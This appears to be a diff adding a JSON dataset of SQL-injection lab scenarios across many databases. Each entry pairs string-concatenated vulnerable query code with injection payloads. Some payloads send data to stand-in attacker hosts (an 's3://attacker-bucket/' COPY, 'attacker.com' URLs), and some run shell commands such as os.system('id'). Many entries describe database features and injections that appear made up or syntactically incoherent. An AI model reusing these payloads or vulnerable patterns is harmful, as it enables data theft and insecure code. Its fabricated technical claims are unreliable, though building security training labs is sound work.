@@ -1,0 +1,3209 @@
+[
+    {
+      "Lab scenario": "SQL Injection in PostgreSQL CREATE TRANSFORM",
+      "Lab Description": "A data processing system dynamically creates PostgreSQL transforms between data types. The transform functions are concatenated directly into CREATE TRANSFORM statements, allowing injection during type conversion operations.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify transform creation endpoints",
+        "Inject through FROM SQL function parameter",
+        "Bypass language handler validation",
+        "Execute commands during type conversion",
+        "Pivot through connected data pipelines"
+      ],
+      "Vulnerability name": "PostgreSQL Transform Injection",
+      "srcCode": "CREATE TRANSFORM FOR type_name LANGUAGE sql (FROM SQL WITH FUNCTION '\\'' + userFunction + '\\'')",
+      "payloads": [
+        "pg_catalog.obj_description') FROM pg_class--",
+        "plpython3u_inline() LANGUAGE plpython3u AS $$import os; os.system('id')$$--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in MySQL Component_Service Metrics",
+      "Lab Description": "A monitoring system uses MySQL's component_service metrics with dynamic filter expressions. The metric filters are concatenated directly into performance_schema queries, allowing injection through crafted metric names.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify component_service usage",
+        "Inject through metric filter parameters",
+        "Bypass metric name validation",
+        "Access restricted performance data",
+        "Exfiltrate via metric aggregation"
+      ],
+      "Vulnerability name": "MySQL Component Metrics Injection",
+      "srcCode": "CALL component_service.get_metric('\\'' + userMetric + '\\'')",
+      "payloads": [
+        "cpu_utilization' FROM (SELECT * FROM mysql.user) x--",
+        "memory_usage' WHERE 1=0 UNION SELECT 1,2,table_name FROM information_schema.tables--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in SQL Server Graph SHORTEST_PATH Node Filters",
+      "Lab Description": "A graph analytics platform builds SHORTEST_PATH queries with dynamic node filters. The filter conditions are concatenated directly into graph traversal logic, allowing injection during path calculation.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify SHORTEST_PATH usage",
+        "Craft malicious node property filters",
+        "Bypass graph syntax validation",
+        "Access unauthorized graph nodes",
+        "Exfiltrate relationship data"
+      ],
+      "Vulnerability name": "SQL Server Graph Path Injection",
+      "srcCode": "MATCH SHORTEST_PATH((n {name: '\\'' + userFilter + '\\''})-[*]->(m))",
+      "payloads": [
+        "admin' OR 1=CONVERT(INT,(SELECT @@version))--",
+        "test'})-[*]->(m) WHERE EXISTS(SELECT * FROM sys.sql_logins)--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Oracle Text INDEX SET STOPLIST",
+      "Lab Description": "A document search system dynamically configures Oracle Text stoplists. The stoplist parameters are concatenated directly into index maintenance operations, allowing injection during search optimization.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify stoplist configuration",
+        "Inject through stopword parameters",
+        "Bypass CTXSYS privilege checks",
+        "Manipulate search results",
+        "Access indexed document content"
+      ],
+      "Vulnerability name": "Oracle Text Stoplist Injection",
+      "srcCode": "CTX_DDL.SET_STOPLIST('\\'' + userIndex + '\\'', '\\'' + userStoplist + '\\'')",
+      "payloads": [
+        "ctxsys.ctx_report.index_size') FROM all_indexes--",
+        "default_stoplist', 'ctx_output.start_log(''/tmp/pwned'')')--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Snowflake EXTERNAL FUNCTION Request Transformers",
+      "Lab Description": "A Snowflake pipeline uses external functions with dynamic request transformers. The JavaScript transformer code is concatenated directly into function definitions, allowing injection during API request generation.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Identify external function creation",
+        "Inject through request_transformer parameter",
+        "Bypress JavaScript sandboxing",
+        "Execute arbitrary Snowflake SQL",
+        "Access account usage data"
+      ],
+      "Vulnerability name": "Snowflake Request Transformer Injection",
+      "srcCode": "CREATE EXTERNAL FUNCTION my_func() RETURNS VARIANT REQUEST_TRANSFORMER = '\\'' + userJs + '\\''",
+      "payloads": [
+        "function transform() { return execute('SELECT * FROM information_schema.tables'); }",
+        "() => { return {sqlText: 'SELECT current_role()'}; }"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in BigQuery ARRAY_AGG Order By Clause",
+      "Lab Description": "A data visualization tool builds ARRAY_AGG queries with dynamic ORDER BY expressions. The sort clauses are concatenated directly into array aggregation, allowing injection during result ordering.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify ARRAY_AGG usage",
+        "Inject through ORDER BY parameter",
+        "Bypass array function constraints",
+        "Access project metadata",
+        "Exfiltrate via sorted array elements"
+      ],
+      "Vulnerability name": "BigQuery Array Order Injection",
+      "srcCode": "SELECT ARRAY_AGG(name ORDER BY '\\'' + userSort + '\\'') FROM users",
+      "payloads": [
+        "1) FROM (SELECT dataset_id FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA)--",
+        "(SELECT COUNT(*) FROM sensitive_tables)) OVER()--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Azure Synapse CETAS Partition Clause",
+      "Lab Description": "A data pipeline creates CETAS tables with dynamic partition specifications. The partition clauses are concatenated directly into external table creation, allowing injection during file writing operations.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify CETAS partition usage",
+        "Inject through PARTITION BY parameter",
+        "Bypass path validation",
+        "Modify file output structure",
+        "Exfiltrate via partition directories"
+      ],
+      "Vulnerability name": "Synapse CETAS Partition Injection",
+      "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (PARTITION ('\\'' + userPartition + '\\'')) AS SELECT * FROM source",
+      "payloads": [
+        "col1='value'') WITH (FORMAT='PARQUET') UNION SELECT * FROM sys.sql_logins--",
+        "date='2023-01-01')) FROM sys.dm_pdw_exec_requests--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Databricks Delta Lake OPTIMIZE ZORDER BY",
+      "Lab Description": "A data optimization job uses OPTIMIZE with dynamic ZORDER BY columns. The column names are concatenated directly into file reorganization commands, allowing injection during data compaction.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify OPTIMIZE operations",
+        "Inject through ZORDER BY parameter",
+        "Bypass column name validation",
+        "Access unauthorized table versions",
+        "Manipulate file layout"
+      ],
+      "Vulnerability name": "Delta Lake ZORDER Injection",
+      "srcCode": "OPTIMIZE delta.`/path` ZORDER BY ('\\'' + userColumns + '\\'')",
+      "payloads": [
+        "id') FROM (DESCRIBE HISTORY delta.`/path/to/sensitive_table`)--",
+        "email')) SET TBLPROPERTIES ('comment'=(SELECT * FROM hive_metastore.default.secrets))--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Amazon Redshift UNLOAD MANIFEST",
+      "Lab Description": "A data export pipeline uses UNLOAD with dynamic manifest options. The manifest parameters are concatenated directly into S3 export operations, allowing injection during file listing generation.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify UNLOAD MANIFEST usage",
+        "Inject through manifest options",
+        "Bypass S3 path validation",
+        "Modify export behavior",
+        "Exfiltrate via manifest files"
+      ],
+      "Vulnerability name": "Redshift Manifest Injection",
+      "srcCode": "UNLOAD ('SELECT * FROM table') TO 's3://path' MANIFEST '\\'' + userOptions + '\\''",
+      "payloads": [
+        "true') FROM svv_external_tables--",
+        "false'))) COPY (SELECT * FROM pg_user) TO 's3://attacker-bucket/'--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Snowflake STREAMS Table Parameter",
+      "Lab Description": "A change data capture system creates STREAMS with dynamic table parameters. The table specifications are concatenated directly into change tracking setup, allowing injection during stream initialization.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify STREAM creation",
+        "Inject through table name parameter",
+        "Bypass change tracking validation",
+        "Access unauthorized change data",
+        "Exfiltrate via stream content"
+      ],
+      "Vulnerability name": "Snowflake Stream Table Injection",
+      "srcCode": "CREATE STREAM my_stream ON TABLE '\\'' + userTable + '\\''",
+      "payloads": [
+        "legit_table') FROM (SELECT * FROM information_schema.tables)--",
+        "sensitive_data')) CHANGE_TRACKING = TRUE RETURNING *--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Google Cloud Spanner INTERLEAVE IN PARENT CASCADE",
+      "Lab Description": "A schema migration tool builds INTERLEAVE IN PARENT clauses with dynamic cascade options. The cascade parameters are concatenated directly into table relationships, allowing injection during schema modification.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify interleaved table creation",
+        "Inject through CASCADE parameter",
+        "Bypass schema validation",
+        "Modify table relationships",
+        "Access unauthorized datasets"
+      ],
+      "Vulnerability name": "Spanner Interleave Cascade Injection",
+      "srcCode": "CREATE TABLE child INTERLEAVE IN PARENT parent '\\'' + userCascade + '\\''",
+      "payloads": [
+        "ON DELETE CASCADE') FROM (SELECT * FROM information_schema.tables)--",
+        "ON UPDATE NO ACTION))) SELECT * FROM SPANNER_SYS.KEY_COLUMN_USAGE--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Azure Data Explorer External Table Schema Inference",
+      "Lab Description": "A Kusto cluster creates external tables with dynamic schema inference parameters. The inference clauses are concatenated directly into schema detection, allowing injection during table creation.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify external table creation",
+        "Inject through schema inference parameters",
+        "Bypass type detection validation",
+        "Modify query results",
+        "Access unauthorized storage paths"
+      ],
+      "Vulnerability name": "Kusto Schema Inference Injection",
+      "srcCode": ".create external table ext_data (['\\'' + userSchema + '\\''])",
+      "payloads": [
+        "col1:string) FROM (SELECT * FROM .show tables) x--",
+        "col1:dynamic) WITH (FORMAT='JSON') WHERE 1=0 UNION SELECT 1--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
+      "Lab Description": "An application builds Elasticsearch ODBC connection strings with dynamic properties. The properties are concatenated directly into driver initialization, allowing injection during connection establishment.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify ODBC connection points",
+        "Inject through connection properties",
+        "Bypass driver validation",
+        "Access restricted indices",
+        "Exfiltrate via driver errors"
+      ],
+      "Vulnerability name": "Elasticsearch ODBC Connection Injection",
+      "srcCode": "Driver={Elasticsearch ODBC};Server=\"{{userServer}}\";Properties=\"{{userProps}}\"",
+      "payloads": [
+        "attacker.com;security=\\\\\\\" + (SELECT * FROM information_schema.tables) + \\\\\\\"--",
+        "legit.com:9200\\\";UID=admin\\\";PWD=' OR 1=1--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
+      "Lab Description": "A Druid cluster processes SQL queries with dynamic identifier escaping. The escape sequences are concatenated directly into query planning, allowing injection through crafted identifier patterns.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify dynamic identifier usage",
+        "Inject through escape sequences",
+        "Bypass SQL parser validation",
+        "Access system metadata tables",
+        "Execute native Druid queries"
+      ],
+      "Vulnerability name": "Druid Identifier Escape Injection",
+      "srcCode": "SELECT * FROM \"{{userTable}}\"",
+      "payloads": [
+        "datasource\\\\\" FROM (SELECT * FROM sys.segments) x--",
+        "legit_table\\\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in InfluxDB Flux Yield Name Parameter",
+      "Lab Description": "A monitoring system uses InfluxDB Flux with dynamic yield names. The yield identifiers are concatenated directly into result processing, allowing injection during data output generation.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify yield statement usage",
+        "Inject through yield name parameter",
+        "Bypass Flux parser validation",
+        "Modify query results",
+        "Exfiltrate via yielded output"
+      ],
+      "Vulnerability name": "Flux Yield Name Injection",
+      "srcCode": "from(bucket:\\\"metrics\\\") |> yield(name: \\\"{userYield}\\\")",
+      "payloads": [
+        "result\\\" FROM (SELECT * FROM sql_metrics) x--",
+        "data\\\" WHERE 1=0) UNION SELECT 1--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Refresh Policy",
+      "Lab Description": "A time-series platform configures continuous aggregates with dynamic refresh policies. The policy parameters are concatenated directly into materialization jobs, allowing injection during view maintenance.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify continuous aggregates",
+        "Inject through refresh policy parameters",
+        "Trigger materialization jobs",
+        "Bypass time bucket validation",
+        "Compromise hypertable data"
+      ],
+      "Vulnerability name": "Timescale Refresh Policy Injection",
+      "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
+      "payloads": [
+        "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
+        "sensitive_view', INTERVAL '1 day'))) RETURNING *--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in CockroachDB Changefeed Filter Expressions",
+      "Lab Description": "A CDC pipeline creates changefeeds with dynamic filter expressions. The filters are concatenated directly into change event generation, allowing injection during data capture.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify changefeed creation",
+        "Inject through filter parameter",
+        "Trigger change events",
+        "Bypass CDC validation",
+        "Exfiltrate via webhook payloads"
+      ],
+      "Vulnerability name": "CockroachCDC Filter Injection",
+      "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\\'' + userFilter + '\\''",
+      "payloads": [
+        "SELECT * FROM users WHERE type = 'admin'--",
+        "SELECT *, (SELECT version()) FROM users--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
+      "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into cloud storage operations, allowing injection during file access.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify S3 configuration points",
+        "Inject through endpoint parameters",
+        "Bypass URL validation",
+        "Modify remote data access",
+        "Exfiltrate credentials"
+      ],
+      "Vulnerability name": "DuckDB S3 Endpoint Injection",
+      "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
+      "payloads": [
+        "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
+        "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/'--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
+      "Lab Description": "A data warehouse creates materialized views with dynamic data loading options. The WITH DATA clauses are concatenated directly into view creation, allowing injection during initial population.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify materialized view creation",
+        "Inject through WITH DATA parameter",
+        "Trigger view population",
+        "Bypass data validation",
+        "Modify view contents"
+      ],
+      "Vulnerability name": "Materialized View Data Clause Injection",
+      "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source '\\'' + userDataOption + '\\''",
+      "payloads": [
+        "WITH NO DATA) FROM (SELECT * FROM pg_matviews) x--",
+        "WITH DATA) WHERE 1=0 UNION SELECT 1,2,3--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
+      "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation, allowing injection during cryptographic verification.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Identify ledger view creation",
+        "Inject through view options",
+        "Trigger ledger verification",
+        "Bypass blockchain validation",
+        "Modify historical records"
+      ],
+      "Vulnerability name": "SQL Ledger View Injection",
+      "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
+      "payloads": [
+        "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
+        "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
+      "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses, allowing injection during table expansion.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify wildcard table usage",
+        "Inject through table pattern",
+        "Bypass pattern validation",
+        "Access unauthorized datasets",
+        "Exfiltrate via table expansion"
+      ],
+      "Vulnerability name": "BigQuery Wildcard Injection",
+      "srcCode": "SELECT * FROM `project.dataset.${userPattern}`",
+      "payloads": [
+        "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
+        "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
+      "Lab Description": "A configuration tool sets Snowflake session parameters with dynamic defaults. The default expressions are concatenated directly into session initialization, allowing injection during connection setup.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify session parameter settings",
+        "Inject through default value expressions",
+        "Trigger new session creation",
+        "Bypass parameter validation",
+        "Persist settings across queries"
+      ],
+      "Vulnerability name": "Snowflake Session Default Injection",
+      "srcCode": "ALTER SESSION SET '\\'' + userParam + '\\'' = '\\'' + userValue + '\\''",
+      "payloads": [
+        "TIMESTAMP_OUTPUT_FORMAT', 'YYYY-MM-DD HH24:MI:SS') FROM (SELECT * FROM information_schema.tables)--",
+        "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
+      "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation, allowing injection during cluster startup.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Identify warehouse creation endpoints",
+        "Inject through config parameters",
+        "Trigger warehouse startup",
+        "Bypass config validation",
+        "Access metastore via driver nodes"
+      ],
+      "Vulnerability name": "Databricks Warehouse Config Injection",
+      "srcCode": "CREATE WAREHOUSE my_warehouse WITH '\\'' + userConfig + '\\''",
+      "payloads": [
+        "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables)--",
+        "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
+      "Lab Description": "A Trino cluster creates functions with dynamic namespace paths. The namespace strings are concatenated directly into function registration, allowing injection during UDF execution.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify function creation endpoints",
+        "Inject through namespace parameters",
+        "Trigger function execution",
+        "Bypass namespace validation",
+        "Access system functions"
+      ],
+      "Vulnerability name": "Trino Function Namespace Injection",
+      "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
+      "payloads": [
+        "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs)--",
+        "pg_catalog', 'SELECT * FROM pg_user')--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in Presto Table Function Arguments",
+      "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The argument strings are concatenated directly into function calls, allowing injection during table generation.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Identify table function usage",
+        "Inject through function arguments",
+        "Bypass argument validation",
+        "Modify generated table contents",
+        "Access system tables via function errors"
+      ],
+      "Vulnerability name": "Presto Table Function Injection",
+      "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
+      "payloads": [
+        "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes)--",
+        "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
+      ]
+    },
+    {
+      "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
+      "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source URLs. The URLs are concatenated directly into dictionary definitions, allowing injection during data loading.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Identify dictionary creation",
+        "Inject through source URL parameters",
+        "Trigger dictionary reload",
+        "Bypass URL validation",
+        "Modify dictionary contents"
+      ],
+      "Vulnerability name": "ClickHouse Dictionary URL Injection",
+      "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\'' + userUrl + '\\'')))",
+      "payloads": [
+        "http://attacker.com/payload')) FROM (SELECT * FROM system.dictionaries)--",
+        "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
+      ]
+    },
+
+
+    
+        {
+          "Lab scenario": "SQL Injection in MongoDB $expr Operator",
+          "Lab Description": "A NoSQL application builds aggregation pipelines with dynamic $expr conditions. The expressions are concatenated directly into pipeline stages, allowing injection during document processing.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify $expr usage",
+            "Inject through expression parameters",
+            "Bypass BSON validation",
+            "Execute arbitrary JavaScript",
+            "Exfiltrate via aggregation output"
+          ],
+          "Vulnerability name": "MongoDB Expression Injection",
+          "srcCode": "db.users.aggregate([{ $match: { $expr: '\\'' + userExpr + '\\'' } }])",
+          "payloads": [
+            "'$eq': ['$username', 'admin']}});//",
+            "'$function': {'body': 'function() { return db.adminCommand({listDatabases:1}) }'}}--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in MariaDB System Versioning",
+          "Lab Description": "A temporal database system uses MariaDB's system versioning with dynamic AS OF parameters. The timestamp expressions are concatenated directly into historical queries.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify SYSTEM_VERSIONING usage",
+            "Inject through AS OF clauses",
+            "Bypass timestamp validation",
+            "Access historical data versions",
+            "Modify temporal records"
+          ],
+          "Vulnerability name": "MariaDB Temporal Injection",
+          "srcCode": "SELECT * FROM documents FOR SYSTEM_TIME AS OF '\\'' + userTime + '\\''",
+          "payloads": [
+            "2023-01-01') FROM (SELECT * FROM information_schema.tables)--",
+            "NOW() - INTERVAL 1 DAY)) WHERE 1=0 UNION SELECT 1,2,3--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in IBM DB2 Label-Based Access Control",
+          "Lab Description": "A security system uses DB2's LBAC with dynamic security label comparisons. The label expressions are concatenated directly into row filtering.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify LBAC usage",
+            "Inject through SECURITY_LABEL_TO_CHAR",
+            "Bypass label validation",
+            "Elevate privileges",
+            "Access restricted rows"
+          ],
+          "Vulnerability name": "DB2 LBAC Injection",
+          "srcCode": "SELECT * FROM sensitive_data WHERE SECURITY_LABEL_TO_CHAR(label) = '\\'' + userLabel + '\\''",
+          "payloads": [
+            "TOP_SECRET') FROM (SELECT * FROM syscat.tables)--",
+            "PUBLIC' OR 1=CONVERT(INT,(SELECT session_user)))--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in SAP HANA Calculation View Parameters",
+          "Lab Description": "An analytics platform builds calculation views with dynamic input parameters. The parameter values are concatenated directly into view execution.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify calculation view usage",
+            "Inject through input parameters",
+            "Bypass parameter validation",
+            "Access underlying tables",
+            "Manipulate analytical results"
+          ],
+          "Vulnerability name": "HANA Calc View Injection",
+          "srcCode": "SELECT * FROM \"_SYS_BIC\".\"package/calc_view\"('PLACEHOLDER' = ('\\'' + userParam + '\\''))",
+          "payloads": [
+            "param1', 'value1') FROM (SELECT * FROM \"_SYS_STATISTICS\".\"STATISTICS\")--",
+            "$$param$$', '1'')) WITH PARAMETERS ($$param2$$='admin')--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Teradata Query Banding",
+          "Lab Description": "A monitoring system uses Teradata query bands with dynamic session attributes. The band values are concatenated directly into workload management.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify SET QUERY_BAND usage",
+            "Inject through band parameters",
+            "Bypass workload rules",
+            "Elevate priority",
+            "Access restricted workloads"
+          ],
+          "Vulnerability name": "Teradata Query Band Injection",
+          "srcCode": "SET QUERY_BAND = '\\'' + userBand + '\\'' FOR SESSION",
+          "payloads": [
+            "app=reporting') FROM dbc.tables--",
+            "urgency=Hard;SELECT * FROM dbc.users;--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Oracle Text CONTAINS Scoring",
+          "Lab Description": "A search application builds Oracle Text queries with dynamic score expressions. The scoring parameters are concatenated directly into CONTAINS operations.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify SCORE() usage",
+            "Inject through label parameters",
+            "Bypass score validation",
+            "Manipulate result ranking",
+            "Access restricted documents"
+          ],
+          "Vulnerability name": "Oracle Text Score Injection",
+          "srcCode": "SELECT SCORE(1) FROM docs WHERE CONTAINS(text, '\\'' + userQuery + '\\'', 1) > 0",
+          "payloads": [
+            "search_term') FROM (SELECT * FROM ctxsys.ctx_indexes)--",
+            "test'' AND 1=ctxsys.driload.validate_stmt('SELECT * FROM sys.user$')--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in SQLite FTS5 Virtual Table Options",
+          "Lab Description": "A mobile app creates SQLite FTS5 tables with dynamic content options. The configuration strings are concatenated directly into full-text search setup.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify FTS5 table creation",
+            "Inject through content= parameters",
+            "Bypass tokenizer validation",
+            "Access source table data",
+            "Manipulate search indexes"
+          ],
+          "Vulnerability name": "SQLite FTS5 Option Injection",
+          "srcCode": "CREATE VIRTUAL TABLE fts_table USING fts5(content='\\'' + userContent + '\\'')",
+          "payloads": [
+            "source_table') FROM (SELECT * FROM sqlite_master)--",
+            "real_table'' WHERE 1=0 UNION SELECT 1,2,3--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Cassandra CQL User-Defined Function Imports",
+          "Lab Description": "A Cassandra cluster creates UDFs with dynamic import declarations. The import paths are concatenated directly into function compilation.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify CREATE FUNCTION usage",
+            "Inject through import parameters",
+            "Bypass sandbox restrictions",
+            "Load malicious classes",
+            "Execute Java code"
+          ],
+          "Vulnerability name": "Cassandra UDF Import Injection",
+          "srcCode": "CREATE FUNCTION my_func RETURNS text LANGUAGE java AS '\\'' + userCode + '\\'' USING '\\'' + userImports + '\\''",
+          "payloads": [
+            "attacker.com/Malicious.class') FROM system_schema.functions--",
+            "java.lang.Runtime')) { return Runtime.getRuntime().exec('id'); }--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Neo4j APOC Load CSV Headers",
+          "Lab Description": "A graph ETL pipeline uses APOC's load CSV with dynamic header mappings. The header parameters are concatenated directly into file imports.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify apoc.load.csv usage",
+            "Inject through header mappings",
+            "Bypass CSV validation",
+            "Modify graph structure",
+            "Access local files"
+          ],
+          "Vulnerability name": "Neo4j CSV Header Injection",
+          "srcCode": "CALL apoc.load.csv('file.csv', { header: '\\'' + userHeaders + '\\'' })",
+          "payloads": [
+            "true') FROM (MATCH (n) RETURN n LIMIT 1)--",
+            "false'}) YIELD line WHERE 1=0 UNION MATCH (n) RETURN n--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in RedisGraph Query Aliases",
+          "Lab Description": "A Redis module builds graph queries with dynamic node aliases. The alias names are concatenated directly into Cypher execution.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify GRAPH.QUERY usage",
+            "Inject through alias parameters",
+            "Bypass parser validation",
+            "Access unauthorized nodes",
+            "Modify graph properties"
+          ],
+          "Vulnerability name": "RedisGraph Alias Injection",
+          "srcCode": "GRAPH.QUERY 'MATCH ('\\'' + userAlias + '\\'') RETURN *'",
+          "payloads": [
+            "n) WHERE n.property = 1 RETURN n--",
+            "a)-[r]->(b) WHERE 1=redis.call('INFO')--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in ArangoDB AQL PRUNE Conditions",
+          "Lab Description": "A document traversal system builds AQL queries with dynamic PRUNE clauses. The conditions are concatenated directly into graph traversals.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify PRUNE usage",
+            "Inject through traversal conditions",
+            "Bypass depth limits",
+            "Access restricted paths",
+            "Modify document links"
+          ],
+          "Vulnerability name": "ArangoDB PRUNE Injection",
+          "srcCode": "FOR v IN 1..5 OUTBOUND 'docs/start' GRAPH 'my_graph' PRUNE '\\'' + userCondition + '\\''",
+          "payloads": [
+            "v._key == 'secret') RETURN v--",
+            "1==1) FILTER CURRENT_USER() == 'root' RETURN 1--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in CouchDB Mango Query Operators",
+          "Lab Description": "A document store uses CouchDB's Mango with dynamic operator selection. The operator names are concatenated directly into find operations.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify $operator usage",
+            "Inject through operator parameters",
+            "Bypass JSON validation",
+            "Access design documents",
+            "Execute admin functions"
+          ],
+          "Vulnerability name": "CouchDB Operator Injection",
+          "srcCode": "db.find({ selector: { field: { '\\'' + userOp + '\\'': '\\'' + userVal + '\\'' } } })",
+          "payloads": [
+            "$eq': 1, '$where': '1==1' }--",
+            "$ne': 0 }); this.constructor.require('child_process').exec('id')--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in InfluxDB Flux Pivot Columns",
+          "Lab Description": "A time-series dashboard builds Flux queries with dynamic pivot columns. The column names are concatenated directly into data reshaping.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify pivot() usage",
+            "Inject through column parameters",
+            "Bypass schema validation",
+            "Manipulate time buckets",
+            "Access system measurements"
+          ],
+          "Vulnerability name": "Flux Pivot Injection",
+          "srcCode": "from(bucket:\"metrics\") |> pivot(rowKey:[\"_time\"], columnKey:[\"\\'' + userCol + '\\'\"])",
+          "payloads": [
+            "_measurement\") FROM (SELECT * FROM _internal.monitor)--",
+            "_field\"]) |> yield(name: \"exploit\")--"
+          ]
+        },
